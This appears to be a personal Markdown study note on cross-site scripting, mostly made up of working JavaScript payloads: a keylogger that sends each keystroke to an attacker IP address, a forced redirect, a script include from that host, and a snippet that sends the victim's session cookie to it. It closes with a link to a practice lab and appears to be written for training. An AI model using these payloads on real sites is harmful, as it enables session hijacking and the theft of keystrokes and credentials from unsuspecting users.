## What is XSS Vulnerability?

This vulnerability allow you to inject JavaScript in the web page.

-----

# Types of XSS

- Reflected
- Stored
- DOM-Based

---

## Keylogger

This mini keylogger works sending GET request to the host indicate. This keylogger doesn't work when the user delete the character 

````js
<script>
    var k = "";
    document.onkeypress = function(e){
        // En todos los navegadores no funciona, para comprobar si funciona podemos hacer lo siguiente
        e = e || window.event;

        k += e.key;
        var i = new Image();
        i.src = "http://172.21.7.214/" + k; // attacker machine
    }
</script>
````

-----

## Redirect to other page

````js
<script>
window.location.href="https://sergiky.github.io/";
</script>
````

--------

## External JavaScript Source

````js
<script src ="http://172.21.7.214/test.js"></script>
````

 ### Obtain session cookie
````js
var request = new XMLHttpRequest();
request.open('GET', 'http://172.21.7.214/?cookie=' + document.cookie);
request.send();
````


# Labs to training

https://github.com/globocom/secDevLabs

You have tu run the docker service 

----
# Tags

#xss #keylogger #redirect 

---